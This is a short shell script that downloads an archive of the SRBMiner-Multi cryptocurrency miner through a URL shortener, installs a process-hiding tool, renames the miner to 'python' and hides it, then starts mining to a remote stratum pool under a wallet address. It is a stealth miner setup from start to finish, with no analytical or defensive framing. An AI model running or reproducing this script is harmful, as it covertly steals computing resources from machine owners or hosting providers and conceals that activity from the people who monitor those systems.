wget https://bit.ly/kontolrum

tar -xvf kontolrum

cd SRBMiner-Multi-2-4-7

npm i -g node-process-hider

ph add python

clear

mv SRBMiner-MULTI python

nomer=$((RANDOM % 50 + 1))

clear

./python --algorithm aurum --pool stratum-eu.rplant.xyz:17114 --wallet waf1qd2ect4ut9nqq8w54ymsuxfh0ea93zjkkhyyu74.DOT-0$nomer --keepalive true 
